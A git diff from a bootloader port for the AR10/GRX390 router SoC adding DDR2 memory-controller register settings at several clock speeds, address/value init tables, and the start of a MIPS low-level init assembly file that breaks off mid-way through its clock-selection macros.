diff --git a/board/ar10/ddr2/xrx300_ddr2_8bit_150M_settings.h b/board/ar10/ddr2/xrx300_ddr2_8bit_150M_settings.h
new file mode 100755
--- /dev/null
+++ b/board/ar10/ddr2/xrx300_ddr2_8bit_150M_settings.h
@@ -0,0 +1,69 @@
+/*
+   Settings for MT47H64M8CF-25E
+*/
+#define	MC_CCR00_VALUE	0x400
+#define	MC_CCR01_VALUE	0x0
+#define	MC_CCR02_VALUE	0x2007531
+#define	MC_CCR03_VALUE	0x2020308
+#define	MC_CCR04_VALUE	0x2070902
+#define	MC_CCR05_VALUE	0x3020202
+#define	MC_CCR06_VALUE	0x3032905
+#define	MC_CCR07_VALUE	0x1010000
+#define	MC_CCR08_VALUE	0x50302
+#define	MC_CCR09_VALUE	0x20000C8
+#define	MC_CCR10_VALUE	0x2003D06
+#define	MC_CCR11_VALUE	0x1010000
+#define	MC_CCR12_VALUE	0x48E0010
+#define	MC_CCR13_VALUE	0x20000
+#define	MC_CCR14_VALUE	0x1200C8
+#define	MC_CCR15_VALUE	0x1000000
+#define	MC_CCR16_VALUE	0x0
+#define	MC_CCR17_VALUE	0x0
+#define	MC_CCR18_VALUE	0x0
+#define	MC_CCR19_VALUE	0x202
+#define	MC_CCR20_VALUE	0x0
+#define	MC_CCR21_VALUE	0x44200
+#define	MC_CCR22_VALUE	0x4
+#define	MC_CCR23_VALUE	0x0
+#define	MC_CCR24_VALUE	0x40442
+#define	MC_CCR25_VALUE	0x0
+#define	MC_CCR26_VALUE	0x6420000
+#define	MC_CCR27_VALUE	0x4
+#define	MC_CCR28_VALUE	0x0
+#define	MC_CCR29_VALUE	0x40642
+#define	MC_CCR30_VALUE	0x0
+#define	MC_CCR31_VALUE	0x1000000
+#define	MC_CCR32_VALUE	0xffff0A02
+#define	MC_CCR33_VALUE	0x1010101
+#define	MC_CCR34_VALUE	0x101
+#define	MC_CCR35_VALUE	0x10101
+#define	MC_CCR36_VALUE	0x10000
+#define	MC_CCR37_VALUE	0x0
+#define	MC_CCR38_VALUE	0x0
+#define	MC_CCR39_VALUE	0x0
+#define	MC_CCR40_VALUE	0x0
+#define	MC_CCR41_VALUE	0x100
+#define	MC_CCR42_VALUE	0x0
+#define	MC_CCR43_VALUE	0x0
+#define	MC_CCR44_VALUE	0x1000201
+#define	MC_CCR45_VALUE	0x100
+#define	MC_CCR46_VALUE	0x0
+#define	MC_CCR47_VALUE	0x0
+#define	MC_CCR48_VALUE	0x600
+#define	MC_CCR49_VALUE	0x79900
+#define	MC_CCR50_VALUE	0x2000200
+#define	MC_CCR51_VALUE	0x2000200
+#define	MC_CCR52_VALUE	0x799
+#define	MC_CCR53_VALUE	0x25fd
+#define	MC_CCR54_VALUE	0x20304
+#define	MC_CCR55_VALUE	0x101
+#define	MC_PHYR0_VALUE	0xf0100
+#define	MC_PHYR1_VALUE	0xf4003827
+#define	MC_PHYR2_VALUE	0x188002c0
+#define	MC_PHYR3_VALUE	0xf4003827
+#define	MC_PHYR4_VALUE	0x188002c0
+#define	MC_PHYR5_VALUE	0x5
+#define	MC_PHYR6_VALUE	0xc0092405
+#define	MC_PHYR7_VALUE	0x92410
+#define	MC_PHYR8_VALUE	0xc0092405
+#define	MC_PHYR9_VALUE	0x92410
diff --git a/board/ar10/ddr2/xrx300_ddr2_8bit_250M_settings.h b/board/ar10/ddr2/xrx300_ddr2_8bit_250M_settings.h
new file mode 100755
--- /dev/null
+++ b/board/ar10/ddr2/xrx300_ddr2_8bit_250M_settings.h
@@ -0,0 +1,70 @@
+/*
+   Settings for MT47H64M8CF-25E
+*/
+
+#define	MC_CCR00_VALUE	0x400
+#define	MC_CCR01_VALUE	0x0
+#define	MC_CCR02_VALUE	0x200EA61
+#define	MC_CCR03_VALUE	0x2020308
+#define	MC_CCR04_VALUE	0x30E1203
+#define	MC_CCR05_VALUE	0x3020304
+#define	MC_CCR06_VALUE	0x3035209
+#define	MC_CCR07_VALUE	0x1010000
+#define	MC_CCR08_VALUE	0x90504
+#define	MC_CCR09_VALUE	0x20000C8
+#define	MC_CCR10_VALUE	0x400790B
+#define	MC_CCR11_VALUE	0x1000000
+#define	MC_CCR12_VALUE	0x91C0020
+#define	MC_CCR13_VALUE	0x20000
+#define	MC_CCR14_VALUE	0x2300C8
+#define	MC_CCR15_VALUE	0x1000000
+#define	MC_CCR16_VALUE	0x0
+#define	MC_CCR17_VALUE	0x0
+#define	MC_CCR18_VALUE	0x0
+#define	MC_CCR19_VALUE	0x202
+#define	MC_CCR20_VALUE	0x0
+#define	MC_CCR21_VALUE	0x84200
+#define	MC_CCR22_VALUE	0x4
+#define	MC_CCR23_VALUE	0x0
+#define	MC_CCR24_VALUE	0x40842
+#define	MC_CCR25_VALUE	0x0
+#define	MC_CCR26_VALUE	0x6420000
+#define	MC_CCR27_VALUE	0x4
+#define	MC_CCR28_VALUE	0x0
+#define	MC_CCR29_VALUE	0x40642
+#define	MC_CCR30_VALUE	0x0
+#define	MC_CCR31_VALUE	0x1000000
+#define	MC_CCR32_VALUE	0xffff0A02
+#define	MC_CCR33_VALUE	0x1010101
+#define	MC_CCR34_VALUE	0x101
+#define	MC_CCR35_VALUE	0x10101
+#define	MC_CCR36_VALUE	0x10000
+#define	MC_CCR37_VALUE	0x0
+#define	MC_CCR38_VALUE	0x0
+#define	MC_CCR39_VALUE	0x0
+#define	MC_CCR40_VALUE	0x0
+#define	MC_CCR41_VALUE	0x100
+#define	MC_CCR42_VALUE	0x0
+#define	MC_CCR43_VALUE	0x0
+#define	MC_CCR44_VALUE	0x1000201
+#define	MC_CCR45_VALUE	0x100
+#define	MC_CCR46_VALUE	0x0
+#define	MC_CCR47_VALUE	0x0
+#define	MC_CCR48_VALUE	0x600
+#define	MC_CCR49_VALUE	0x79900
+#define	MC_CCR50_VALUE	0x2000200
+#define	MC_CCR51_VALUE	0x2000200
+#define	MC_CCR52_VALUE	0x799
+#define	MC_CCR53_VALUE	0x25fd
+#define	MC_CCR54_VALUE	0x20304
+#define	MC_CCR55_VALUE	0x101
+#define	MC_PHYR0_VALUE	0xf0100
+#define	MC_PHYR1_VALUE	0xf4013827
+#define	MC_PHYR2_VALUE	0x188002c0
+#define	MC_PHYR3_VALUE	0xf4013827
+#define	MC_PHYR4_VALUE	0x188002c0
+#define	MC_PHYR5_VALUE	0x5
+#define	MC_PHYR6_VALUE	0xc0092405
+#define	MC_PHYR7_VALUE	0x92410
+#define	MC_PHYR8_VALUE	0xc0092405
+#define	MC_PHYR9_VALUE	0x92410
diff --git a/board/ar10/ddr2/xrx300_ddr2_SZ256M_CLK250M_settings.h b/board/ar10/ddr2/xrx300_ddr2_SZ256M_CLK250M_settings.h
new file mode 100755
--- /dev/null
+++ b/board/ar10/ddr2/xrx300_ddr2_SZ256M_CLK250M_settings.h
@@ -0,0 +1,67 @@
+
+#define MC_CCR00_VALUE    0x00000400 
+#define MC_CCR01_VALUE    0x00000000 
+#define MC_CCR02_VALUE    0x0200c351 
+#define MC_CCR03_VALUE    0x02020308 
+#define MC_CCR04_VALUE    0x020c0f02 
+#define MC_CCR05_VALUE    0x03020204 
+#define MC_CCR06_VALUE    0x0303445A 
+#define MC_CCR07_VALUE    0x01010000 
+#define MC_CCR08_VALUE    0x00080404 
+#define MC_CCR09_VALUE    0x020000c8 
+#define MC_CCR10_VALUE    0x0500650a 
+#define MC_CCR11_VALUE    0x01000000 
+#define MC_CCR12_VALUE    0x0798001b 
+#define MC_CCR13_VALUE    0x00020000 
+#define MC_CCR14_VALUE    0x001d00c8 
+#define MC_CCR15_VALUE    0x01000000 
+#define MC_CCR16_VALUE    0x00000000 
+#define MC_CCR17_VALUE    0x00000000 
+#define MC_CCR18_VALUE    0x00000000 
+#define MC_CCR19_VALUE    0x00000202 
+#define MC_CCR20_VALUE    0x00000000 
+#define MC_CCR21_VALUE    0x00064200 
+#define MC_CCR22_VALUE    0x00000004 
+#define MC_CCR23_VALUE    0x00000000 
+#define MC_CCR24_VALUE    0x00040642 
+#define MC_CCR25_VALUE    0x00000000 
+#define MC_CCR26_VALUE    0x06420000 
+#define MC_CCR27_VALUE    0x00000004 
+#define MC_CCR28_VALUE    0x00000000 
+#define MC_CCR29_VALUE    0x00040642 
+#define MC_CCR30_VALUE    0x00000000 
+#define MC_CCR31_VALUE    0x01010000 
+#define MC_CCR32_VALUE    0x0f0f0a02 
+#define MC_CCR33_VALUE    0x01010101 
+#define MC_CCR34_VALUE    0x00000101 
+#define MC_CCR35_VALUE    0x00010001 
+#define MC_CCR36_VALUE    0x00010006 
+#define MC_CCR37_VALUE    0x00000000 
+#define MC_CCR38_VALUE    0x00000000 
+#define MC_CCR39_VALUE    0x00000000 
+#define MC_CCR40_VALUE    0x00000000 
+#define MC_CCR41_VALUE    0x02000100 
+#define MC_CCR42_VALUE    0x08000400 
+#define MC_CCR43_VALUE    0x01010000 
+#define MC_CCR44_VALUE    0x01020201 
+#define MC_CCR45_VALUE    0x00000200 
+#define MC_CCR46_VALUE    0x00000000 
+#define MC_CCR47_VALUE    0x00000000 
+#define MC_CCR48_VALUE    0x00000600 
+#define MC_CCR49_VALUE    0x00079900 
+#define MC_CCR50_VALUE    0x02000200 
+#define MC_CCR51_VALUE    0x02000200 
+#define MC_CCR52_VALUE    0x00000799
+#define MC_CCR53_VALUE    0x000025fd 
+#define MC_CCR54_VALUE    0x00020304 
+#define MC_CCR55_VALUE    0x00000101 
+#define MC_PHYR0_VALUE    0x000f0100 
+#define MC_PHYR1_VALUE    0xf4003827 
+#define MC_PHYR2_VALUE    0x188002c0 
+#define MC_PHYR3_VALUE    0xf4003827 
+#define MC_PHYR4_VALUE    0x188002c0 
+#define MC_PHYR5_VALUE    0x00000005 
+#define MC_PHYR6_VALUE    0xc0092405 
+#define MC_PHYR7_VALUE    0x00092410 
+#define MC_PHYR8_VALUE    0xc0092405 
+#define MC_PHYR9_VALUE    0x00092410 
diff --git a/board/ar10/ddr2/xrx300_ddr2_SZ256M_CLK300M_settings.h b/board/ar10/ddr2/xrx300_ddr2_SZ256M_CLK300M_settings.h
new file mode 100755
--- /dev/null
+++ b/board/ar10/ddr2/xrx300_ddr2_SZ256M_CLK300M_settings.h
@@ -0,0 +1,137 @@
+//#################################################################
+//NEW DDR2 300 MHz values
+#ifndef CONFIG_GRX390_CPUFREQ_AUTO_DETECT
+#define MC_CCR00_VALUE 0x400
+#define MC_CCR01_VALUE 0x0
+#define MC_CCR02_VALUE 0x20101D1
+#define MC_CCR03_VALUE 0x202040A
+#define MC_CCR04_VALUE 0x30E1303
+#define MC_CCR05_VALUE 0x3020305
+#define MC_CCR06_VALUE 0x3035209
+#define MC_CCR07_VALUE 0x1010000
+#define MC_CCR08_VALUE 0x90504
+#define MC_CCR09_VALUE 0x20000C8
+#define MC_CCR10_VALUE 0x500790B
+#define MC_CCR11_VALUE 0x1000000
+#define MC_CCR12_VALUE 0x91C0027
+#define MC_CCR13_VALUE 0x20000
+#define MC_CCR14_VALUE 0x2A00C8
+#define MC_CCR15_VALUE 0x1000000
+#define MC_CCR16_VALUE 0x0
+#define MC_CCR17_VALUE 0x0
+#define MC_CCR18_VALUE 0x0
+#define MC_CCR19_VALUE 0x202
+#define MC_CCR20_VALUE 0x0
+#define MC_CCR21_VALUE 0x85200
+#define MC_CCR22_VALUE 0x4
+#define MC_CCR23_VALUE 0x0
+#define MC_CCR24_VALUE 0x40852
+#define MC_CCR25_VALUE 0x0
+#define MC_CCR26_VALUE 0x6420000
+#define MC_CCR27_VALUE 0x4
+#define MC_CCR28_VALUE 0x0
+#define MC_CCR29_VALUE 0x40642
+#define MC_CCR30_VALUE 0x0
+#define MC_CCR31_VALUE 0x1010000
+#define MC_CCR32_VALUE 0x0f0f0A02
+#define MC_CCR33_VALUE 0x1010101
+#define MC_CCR34_VALUE 0x101
+#define MC_CCR35_VALUE 0x10001
+#define MC_CCR36_VALUE 0x10006
+#define MC_CCR37_VALUE 0x0
+#define MC_CCR38_VALUE 0x0
+#define MC_CCR39_VALUE 0x0
+#define MC_CCR40_VALUE 0x0
+#define MC_CCR41_VALUE 0x2000100
+#define MC_CCR42_VALUE 0x0
+#define MC_CCR43_VALUE 0x01010000
+#define MC_CCR44_VALUE 0x1020201
+#define MC_CCR45_VALUE 0x200
+#define MC_CCR46_VALUE 0x0
+#define MC_CCR47_VALUE 0x0
+#define MC_CCR48_VALUE 0x600
+#define MC_CCR49_VALUE 0x79900
+#define MC_CCR50_VALUE 0x2000200
+#define MC_CCR51_VALUE 0x2000200
+#define MC_CCR52_VALUE 0x799
+#define MC_CCR53_VALUE 0x25fd
+#define MC_CCR54_VALUE 0x20405
+#define MC_CCR55_VALUE 0x101
+#define MC_PHYR0_VALUE 0xf0100
+#define MC_PHYR1_VALUE 0xf4003827
+#define MC_PHYR2_VALUE 0x188002c0
+#define MC_PHYR3_VALUE 0xf4003827
+#define MC_PHYR4_VALUE 0x188002c0
+#define MC_PHYR5_VALUE 0x5
+#define MC_PHYR6_VALUE 0xc0092405
+#define MC_PHYR7_VALUE 0x92410
+#define MC_PHYR8_VALUE 0xc0092405
+#define MC_PHYR9_VALUE 0x92410
+#else
+#define MC_CCR00_VALUE_300M 0x400
+#define MC_CCR01_VALUE_300M 0x0
+#define MC_CCR02_VALUE_300M 0x20101D1
+#define MC_CCR03_VALUE_300M 0x202040A
+#define MC_CCR04_VALUE_300M 0x30E1303
+#define MC_CCR05_VALUE_300M 0x3020305
+#define MC_CCR06_VALUE_300M 0x3035209
+#define MC_CCR07_VALUE_300M 0x1010000
+#define MC_CCR08_VALUE_300M 0x90504
+#define MC_CCR09_VALUE_300M 0x20000C8
+#define MC_CCR10_VALUE_300M 0x500790B
+#define MC_CCR11_VALUE_300M 0x1000000
+#define MC_CCR12_VALUE_300M 0x91C0027
+#define MC_CCR13_VALUE_300M 0x20000
+#define MC_CCR14_VALUE_300M 0x2A00C8
+#define MC_CCR15_VALUE_300M 0x1000000
+#define MC_CCR16_VALUE_300M 0x0
+#define MC_CCR17_VALUE_300M 0x0
+#define MC_CCR18_VALUE_300M 0x0
+#define MC_CCR19_VALUE_300M 0x202
+#define MC_CCR20_VALUE_300M 0x0
+#define MC_CCR21_VALUE_300M 0x85200
+#define MC_CCR22_VALUE_300M 0x4
+#define MC_CCR23_VALUE_300M 0x0
+#define MC_CCR24_VALUE_300M 0x40852
+#define MC_CCR25_VALUE_300M 0x0
+#define MC_CCR26_VALUE_300M 0x6420000
+#define MC_CCR27_VALUE_300M 0x4
+#define MC_CCR28_VALUE_300M 0x0
+#define MC_CCR29_VALUE_300M 0x40642
+#define MC_CCR30_VALUE_300M 0x0
+#define MC_CCR31_VALUE_300M 0x1010000
+#define MC_CCR32_VALUE_300M 0x0f0f0A02
+#define MC_CCR33_VALUE_300M 0x1010101
+#define MC_CCR34_VALUE_300M 0x101
+#define MC_CCR35_VALUE_300M 0x10001
+#define MC_CCR36_VALUE_300M 0x10006
+#define MC_CCR37_VALUE_300M 0x0
+#define MC_CCR38_VALUE_300M 0x0
+#define MC_CCR39_VALUE_300M 0x0
+#define MC_CCR40_VALUE_300M 0x0
+#define MC_CCR41_VALUE_300M 0x2000100
+#define MC_CCR42_VALUE_300M 0x0
+#define MC_CCR43_VALUE_300M 0x01010000
+#define MC_CCR44_VALUE_300M 0x1020201
+#define MC_CCR45_VALUE_300M 0x200
+#define MC_CCR46_VALUE_300M 0x0
+#define MC_CCR47_VALUE_300M 0x0
+#define MC_CCR48_VALUE_300M 0x600
+#define MC_CCR49_VALUE_300M 0x79900
+#define MC_CCR50_VALUE_300M 0x2000200
+#define MC_CCR51_VALUE_300M 0x2000200
+#define MC_CCR52_VALUE_300M 0x799
+#define MC_CCR53_VALUE_300M 0x25fd
+#define MC_CCR54_VALUE_300M 0x20405
+#define MC_CCR55_VALUE_300M 0x101
+#define MC_PHYR0_VALUE_300M 0xf0100
+#define MC_PHYR1_VALUE_300M 0xf4003827
+#define MC_PHYR2_VALUE_300M 0x188002c0
+#define MC_PHYR3_VALUE_300M 0xf4003827
+#define MC_PHYR4_VALUE_300M 0x188002c0
+#define MC_PHYR5_VALUE_300M 0x5
+#define MC_PHYR6_VALUE_300M 0xc0092405
+#define MC_PHYR7_VALUE_300M 0x92410
+#define MC_PHYR8_VALUE_300M 0xc0092405
+#define MC_PHYR9_VALUE_300M 0x92410
+#endif /* CONFIG_GRX390_CPUFREQ_AUTO_DETECT */
diff --git a/board/ar10/ddr2_16bit.conf b/board/ar10/ddr2_16bit.conf
new file mode 100755
--- /dev/null
+++ b/board/ar10/ddr2_16bit.conf
@@ -0,0 +1,70 @@
+0xBF106c98  0x94			
+0xBF801000  0x0	
+0xBF801000 	0x00000400
+0xBF801010 	0x00000000
+0xBF801020 	0x0200c351  
+0xBF801030 	0x02020308
+0xBF801040 	0x030c1103
+0xBF801050 	0x04020606 
+0xBF801060 	0x0303445d
+0xBF801070 	0x01010000
+0xBF801080 	0x00090504
+0xBF801090 	0x020000c8
+0xBF8010A0 	0x0200650a
+0xBF8010B0 	0x01000000
+0xBF8010C0 	0x0798001b
+0xBF8010D0 	0x00020000
+0xBF8010E0 	0x001d00c8
+0xBF8010F0 	0x01000000
+0xBF801100 	0x00000000
+0xBF801110 	0x00000000
+0xBF801120 	0x00000000
+0xBF801130 	0x00000100
+0xBF801140 	0x00000000 
+0xBF801150 	0x00064200
+0xBF801160 	0x00000040
+0xBF801170 	0x00000000
+0xBF801180 	0x00000032
+0xBF801190 	0x00000000
+0xBF8011A0 	0x00320000
+0xBF8011B0 	0x00000000
+0xBF8011C0 	0x00000000
+0xBF8011D0 	0x00000032
+0xBF8011E0 	0x00000000
+0xBF8011F0 	0x02000000
+0xBF801200 	0xffff0a02
+0xBF801210 	0x01010101
+0xBF801220 	0x00010101
+0xBF801230 	0x00000001  
+0xBF801240 	0x00010000
+0xBF801250 	0x00000000
+0xBF801260 	0x00000000
+0xBF801270 	0x00000000
+0xBF801280 	0x00000000
+0xBF801290 	0x00000100
+0xBF8012A0 	0x00000000
+0xBF8012B0 	0x00000303
+0xBF8012C0 	0x01000201
+0xBF8012D0 	0x03030303
+0xBF8012E0 	0x00000000
+0xBF8012F0 	0x00000000
+0xBF801300 	0x00000600
+0xBF801310 	0x00079900
+0xBF801320 	0x02000200 
+0xBF801330 	0x02000200
+0xBF801340 	0x00000799
+0xBF801350 	0x020025fd
+0xBF801360 	0x00020304
+0xBF801370 	0x00000101
+0xBF801400 	0x000f0100
+0xBF801410 	0xf4013827
+0xBF801420 	0x168002c0
+0xBF801430 	0xf4013827
+0xBF801440  0x168002c0
+0xBF801450 	0x00000005
+0xBF801460 	0x20092205
+0xBF801470 	0x00092510
+0xBF801480 	0x20092205
+0xBF801490 	0x00092510
+0xBF801000  0x401
+#0xBF8014B1  0x1
\ No newline at end of file
diff --git a/board/ar10/ddr2_8bit.conf b/board/ar10/ddr2_8bit.conf
--- a/board/ar10/ddr2_8bit.conf
+++ b/board/ar10/ddr2_8bit.conf
@@ -1,71 +1,71 @@
-0xBF106c98  0x94			
-0xBF801000  0x0	
-0xBF801000 	0x00000400
-0xBF801010 	0x00000000
-0xBF801020 	0x0200c351  
-0xBF801030 	0x02020308
-0xBF801040 	0x030c1103
-0xBF801050 	0x04020606 
-0xBF801060 	0x0303445d
-0xBF801070 	0x01010000
-0xBF801080 	0x00090504
-0xBF801090 	0x020000c8
-0xBF8010A0 	0x0200650a
-0xBF8010B0 	0x01000000
-0xBF8010C0 	0x0798001b
-0xBF8010D0 	0x00020000
-0xBF8010E0 	0x001d00c8
-0xBF8010F0 	0x01000000
-0xBF801100 	0x00000000
-0xBF801110 	0x00000000
-0xBF801120 	0x00000000
-0xBF801130 	0x00000100
-0xBF801140 	0x00000000 
-0xBF801150 	0x00064200
-0xBF801160 	0x00000040
-0xBF801170 	0x00000000
-0xBF801180 	0x00000032
-0xBF801190 	0x00000000
-0xBF8011A0 	0x00320000
-0xBF8011B0 	0x00000000
-0xBF8011C0 	0x00000000
-0xBF8011D0 	0x00000032
-0xBF8011E0 	0x00000000
-0xBF8011F0 	0x01000000
-0xBF801200 	0xffff0a02
-0xBF801210 	0x01010101
-0xBF801220 	0x00010101
-0xBF801230 	0x00000101  
-0xBF801240 	0x00010000
-0xBF801250 	0x00000000
-0xBF801260 	0x00000000
-0xBF801270 	0x00000000
-0xBF801280 	0x00000000
-0xBF801290 	0x00000100
-0xBF8012A0 	0x00000000
-0xBF8012B0 	0x00000303
-0xBF8012C0 	0x01000201
-0xBF8012D0 	0x03030303
-0xBF8012E0 	0x00000000
-0xBF8012F0 	0x00000000
-0xBF801300 	0x00000600
-0xBF801310 	0x00079900
-0xBF801320 	0x02000200 
-0xBF801330 	0x02000200
-0xBF801340 	0x00000799
-0xBF801350 	0x020025fd
-0xBF801360 	0x00020304
-0xBF801370 	0x00000101
-0xBF801400 	0x000f0100
-0xBF801410 	0xf4013827
-0xBF801420 	0x168002c0
-0xBF801430 	0xf4013827
-0xBF801440  0x168002c0
-0xBF801450 	0x00000005
-0xBF801460 	0x20092205
-0xBF801470 	0x00092510
-0xBF801480 	0x20092205
-0xBF801490 	0x00092510
-0xBF801000  0x401
-0xBF8014B1  0x1
-0xBF8014E1  0x1
+0xBF106c98  0x94			
+0xBF801000  0x0	
+0xBF801000  0x00000400
+0xBF801010  0x00000000
+0xBF801020  0x0200c351  
+0xBF801030  0x02020308
+0xBF801040  0x030c1103
+0xBF801050  0x04020306 
+0xBF801060  0x0303445d
+0xBF801070  0x01010000
+0xBF801080  0x00090504
+0xBF801090  0x020000c8
+0xBF8010A0  0x0200650a
+0xBF8010B0  0x01000000
+0xBF8010C0  0x0798001b
+0xBF8010D0  0x00020000
+0xBF8010E0  0x001d00c8
+0xBF8010F0  0x01000000
+0xBF801100  0x00000000
+0xBF801110  0x00000000
+0xBF801120  0x00000000
+0xBF801130  0x00000100
+0xBF801140  0x00000000 
+0xBF801150  0x00064200
+0xBF801160  0x00000040
+0xBF801170  0x00000000
+0xBF801180  0x00000032
+0xBF801190  0x00000000
+0xBF8011A0  0x00320000
+0xBF8011B0  0x00000000
+0xBF8011C0  0x00000000
+0xBF8011D0  0x00000032
+0xBF8011E0  0x00000000
+0xBF8011F0  0x01000000
+0xBF801200  0x0f0f0a02
+0xBF801210  0x01010101
+0xBF801220  0x00010101
+0xBF801230  0x00000101
+0xBF801240  0x00010000
+0xBF801250  0x00000000
+0xBF801260  0x00000000
+0xBF801270  0x00000000
+0xBF801280  0x00000000
+0xBF801290  0x00000100
+0xBF8012A0  0x08080404
+0xBF8012B0  0x00000000
+0xBF8012C0  0x01000201
+0xBF8012D0  0x00000200
+0xBF8012E0  0x00000000
+0xBF8012F0  0x00000000
+0xBF801300  0x00000700
+0xBF801310  0x00000000
+0xBF801320  0x02000200 
+0xBF801330  0x02000200
+0xBF801340  0x00000000
+0xBF801350  0x02000200
+0xBF801360  0x00020304
+0xBF801370  0x00000101
+0xBF801400  0x000f1100
+0xBF801410  0xf4013827
+0xBF801420  0x26c002c0
+0xBF801430  0xf4013827
+0xBF801440  0x26c002c0
+0xBF801450  0x00000005
+0xBF801460  0x20092B05
+0xBF801470  0x00092510
+0xBF801480  0x20092505
+0xBF801490  0x00092510
+0xBF801000  0x401
+0xBF8014B1  0x1
+0xBF8014E1  0x1
diff --git a/board/ar10/lowlevel_init.S b/board/ar10/lowlevel_init.S
new file mode 100755
--- /dev/null
+++ b/board/ar10/lowlevel_init.S
@@ -0,0 +1,424 @@
+
+/*
+ *  Memory sub-system initialization code for INCA-IP2 development board.
+ *  Andre Messerschmidt
+ *  Copyright (c) 2005  Infineon Technologies AG 
+ *
+ *  Based on Inca-IP code 
+ *  Copyright (c) 2003  Wolfgang Denk <wd@denx.de>
+ *
+ * See file CREDITS for list of people who contributed to this
+ * project.
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License as
+ * published by the Free Software Foundation; either version 2 of
+ * the License, or (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA 02111-1307 USA
+ */
+/* History:
+      Wu Qi Ming Sep 18, 2009 initial version
+ */
+#include <config.h>
+#include <version.h>
+#include <asm/regdef.h>
+
+
+#define DDR_OFFSET   0xbf801000
+#define DDR_CCR00      (DDR_OFFSET + 0x0000 )
+#define DDR_CCR01      (DDR_OFFSET + 0x0010 )
+#define DDR_CCR02      (DDR_OFFSET + 0x0020 )
+#define DDR_CCR03      (DDR_OFFSET + 0x0030 )
+#define DDR_CCR04      (DDR_OFFSET + 0x0040 )
+#define DDR_CCR05      (DDR_OFFSET + 0x0050 )
+#define DDR_CCR06      (DDR_OFFSET + 0x0060 )
+#define DDR_CCR07      (DDR_OFFSET + 0x0070 )
+#define DDR_CCR08      (DDR_OFFSET + 0x0080 )
+#define DDR_CCR09      (DDR_OFFSET + 0x0090 )
+#define DDR_CCR10      (DDR_OFFSET + 0x00A0 )
+#define DDR_CCR11      (DDR_OFFSET + 0x00B0 )
+#define DDR_CCR12      (DDR_OFFSET + 0x00C0 )
+#define DDR_CCR13      (DDR_OFFSET + 0x00D0 )
+#define DDR_CCR14      (DDR_OFFSET + 0x00E0 )
+#define DDR_CCR15      (DDR_OFFSET + 0x00F0 )
+#define DDR_CCR16      (DDR_OFFSET + 0x0100 )
+#define DDR_CCR17      (DDR_OFFSET + 0x0110 )
+#define DDR_CCR18      (DDR_OFFSET + 0x0120 )
+#define DDR_CCR19      (DDR_OFFSET + 0x0130 )
+#define DDR_CCR20      (DDR_OFFSET + 0x0140 )
+#define DDR_CCR21      (DDR_OFFSET + 0x0150 )
+#define DDR_CCR22      (DDR_OFFSET + 0x0160 )
+#define DDR_CCR23      (DDR_OFFSET + 0x0170 )
+#define DDR_CCR24      (DDR_OFFSET + 0x0180 )
+#define DDR_CCR25      (DDR_OFFSET + 0x0190 )
+#define DDR_CCR26      (DDR_OFFSET + 0x01A0 )
+#define DDR_CCR27      (DDR_OFFSET + 0x01B0 )
+#define DDR_CCR28      (DDR_OFFSET + 0x01C0 )
+#define DDR_CCR29      (DDR_OFFSET + 0x01D0 )
+#define DDR_CCR30      (DDR_OFFSET + 0x01E0 )
+#define DDR_CCR31      (DDR_OFFSET + 0x01F0 )
+#define DDR_CCR32      (DDR_OFFSET + 0x0200 )
+#define DDR_CCR33      (DDR_OFFSET + 0x0210 )
+#define DDR_CCR34      (DDR_OFFSET + 0x0220 )
+#define DDR_CCR35      (DDR_OFFSET + 0x0230 )
+#define DDR_CCR36      (DDR_OFFSET + 0x0240 )
+#define DDR_CCR37      (DDR_OFFSET + 0x0250 )
+#define DDR_CCR38      (DDR_OFFSET + 0x0260 )
+#define DDR_CCR48      (DDR_OFFSET + 0x0270 )
+#define DDR_CCR49      (DDR_OFFSET + 0x0280 )
+#define DDR_CCR50      (DDR_OFFSET + 0x0290 )
+#define DDR_CCR51      (DDR_OFFSET + 0x02A0 )
+#define DDR_CCR54      (DDR_OFFSET + 0x02B0 )
+#define DDR_CCR55      (DDR_OFFSET + 0x02C0 )
+#define DDR_PHYR0      (DDR_OFFSET + 0x0400 )
+#define DDR_PHYR1      (DDR_OFFSET + 0x0410 )
+#define DDR_PHYR2      (DDR_OFFSET + 0x0420 )
+#define DDR_PHYR3      (DDR_OFFSET + 0x0430 )
+#define DDR_PHYR4      (DDR_OFFSET + 0x0440 )
+#define DDR_PHYR5      (DDR_OFFSET + 0x0450 )
+#define DDR_PHYR6      (DDR_OFFSET + 0x0460 )
+#define DDR_PHYR7      (DDR_OFFSET + 0x0470 )
+#define DDR_PHYR8      (DDR_OFFSET + 0x0480 )
+#define DDR_PHYR9      (DDR_OFFSET + 0x0490 )
+#define DDR_PHYR10     (DDR_OFFSET + 0x04A0 )
+#define DDR_PHYR11     (DDR_OFFSET + 0x04B0 )
+#define DDR_PHYR12     (DDR_OFFSET + 0x04C0 )
+#define DDR_PHYR13     (DDR_OFFSET + 0x04D0 )
+#define DDR_PHYR14     (DDR_OFFSET + 0x04E0 ) 
+#define DDR_PHYR15     (DDR_OFFSET + 0x04F0 )
+
+
+#ifdef CONFIG_AR10_CPU_125M_RAM_125M
+   #define CONFIG_AR10_CGU_SYS_VALUE    0x22
+#elif defined(CONFIG_AR10_CPU_250M_RAM_125M)
+   #define CONFIG_AR10_CGU_SYS_VALUE    0x12
+#elif defined(CONFIG_AR10_CPU_250M_RAM_250M)
+   #define CONFIG_AR10_CGU_SYS_VALUE    0x11
+#elif defined(CONFIG_AR10_CPU_500M_RAM_250M)
+   #define CONFIG_AR10_CGU_SYS_VALUE    0x01
+#elif defined(CONFIG_AR10_CPU_600M_RAM_150M) 
+   #define CONFIG_AR10_CGU_SYS_VALUE    0x102
+#elif defined(CONFIG_AR10_CPU_600M_RAM_300M)
+   #define CONFIG_AR10_CGU_SYS_VALUE    0x101
+#elif defined(CONFIG_AR10_CPU_150M_RAM_150M)
+   #define CONFIG_AR10_CGU_SYS_VALUE    0x122
+#elif defined(CONFIG_AR10_CPU_300M_RAM_150M)
+   #define CONFIG_AR10_CGU_SYS_VALUE    0x112
+#elif defined(CONFIG_AR10_CPU_300M_RAM_300M)
+   #define CONFIG_AR10_CGU_SYS_VALUE    0x111
+#elif defined(CONFIG_GRX390_CPU_666M_RAM_333M)
+   #define CONFIG_AR10_CGU_SYS_VALUE	0x301
+#elif defined(CONFIG_GRX390_CPU_180M_RAM_180M)
